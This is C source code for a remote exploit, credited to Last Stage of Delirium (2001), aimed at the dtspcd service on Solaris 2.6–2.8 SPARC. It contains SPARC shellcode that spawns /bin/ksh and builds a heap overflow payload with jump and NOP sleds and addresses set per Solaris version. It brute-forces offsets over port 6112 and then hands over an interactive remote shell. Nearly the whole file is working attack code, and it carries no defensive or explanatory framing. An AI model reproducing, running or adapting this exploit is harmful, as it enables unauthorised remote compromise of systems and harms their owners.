/*## copyright LAST STAGE OF DELIRIUM jun 2001 poland        *://lsd-pl.net/ #*/
/*## dtspcd                                                                  #*/

/* as the final jump to the assembly code is made to the heap area, this code */
/* also works against machines with non-exec stack protection turned on       */

#include <sys/types.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>

#define JMPNUM 1536
#define NOPNUM 2048 

char shellcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>          */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>        */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh"
;

static char nop[]="\x80\x1c\x40\x11";
static char jmp[]="\x81\xc2\xe8\x00";

main(int argc,char **argv){
    int sck,c,i,j,len,vers,offset;
    fd_set readfs;
    struct sockaddr_in address;
    struct hostent *hp;
    char bufor[20000],adr[4],*b; 

    printf("copyright LAST STAGE OF DELIRIUM jun 2001 poland  //lsd-pl.net/\n");
    printf("dtspcd for solaris 2.6 2.7 2.8 sparc\n\n");
    if(argc<3){
          printf("usage: %s host -v 6|7|8 \n",argv[0]);
          exit(-1);
    }
    while((c=getopt(argc-1,&argv[1],"v:"))!=-1){
         switch(c){
	 case 'v': vers=atoi(optarg);
 	 }
    }
    memset(bufor,0xff,sizeof(bufor));
    offset=-256;
    printf("This may take a moment\n");
    lab:
    switch(vers){
    case 6: 
    *(unsigned long*)&bufor[0xff4-0x18]=htonl(0x2d4fc-8);
    *(unsigned long*)&bufor[0xff4-0x00]=htonl(0xeffffb6c-0x8+offset);
    break;
    case 7: 
    *(unsigned long*)&bufor[0xff4-0x18]=htonl(0x2de74);
    *(unsigned long*)&bufor[0xff4-0x00]=htonl(0xffbef9e4-0x8+offset);
    break;
    case 8: 
    *(unsigned long*)&bufor[0xff4-0x18]=htonl(0x2d8ac);
    *(unsigned long*)&bufor[0xff4-0x00]=htonl(0xffbef99c-0x8+offset);
    break;
    default: exit(-1);
    }
    offset=offset+4;
    if(offset%8)
      printf(".");fflush(stdout);
    usleep(100000);
    sck=socket(AF_INET,SOCK_STREAM,0);
    bzero(&address,sizeof(address));
    address.sin_family=AF_INET;
    address.sin_port=htons(6112);
    if((address.sin_addr.s_addr=inet_addr(argv[1]))==-1){
     if((hp=gethostbyname(argv[1]))==NULL){
      errno=EADDRNOTAVAIL;perror("error");exit(-1);
     }
     memcpy(&address.sin_addr.s_addr,hp->h_addr,4);
    }
    if(connect(sck,(struct sockaddr*)&address,sizeof(struct sockaddr_in))<0){
     perror("error");exit(-1);
    }
    len=8192;
    b=bufor;
    b=b+4128;
    for(i=0;i<JMPNUM;i++) *b++=jmp[i%4];
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    sprintf(bufor,"000000 00 %04x 0000 ",len);
    write(sck,bufor,strlen(bufor));
    *(unsigned long*)&bufor[0xff4-0x20]=htonl(0x00000000);
    *(unsigned long*)&bufor[0xff4-0x10]=htonl(0xffffffff);
    *(unsigned long*)&bufor[0x1000]=htonl(len);
    *(unsigned long*)&bufor[0x100c]=htonl(0xffffffc0);
    
    write(sck,bufor,len);
    strcpy(bufor,"000000 00 0000 0000 ");
    write(sck,bufor,strlen(bufor));
    write(sck,"/bin/uname -a\n",14);
    while(1){
        FD_ZERO(&readfs);
        FD_SET(0,&readfs);
        FD_SET(sck,&readfs);   
        if(select(sck+1,&readfs,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&readfs)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue; 
                    else {printf("koniec1\n");exit(-1);}
                }
                write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&readfs)){
                if((cnt=read(sck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue; 
                    else {
			 if(j==0) exit(-1);
			   else{
			      if(offset>=512){printf("\nexploit failed!!!\n");
			        exit(-1);
			      }
			      close(sck);
			      goto lab;
                           }
                   }
                }
		if(cnt>1&&j!=0) printf("sent!\n");
                j=0;
                write(1,buf,cnt);
            }
        }
    }
}

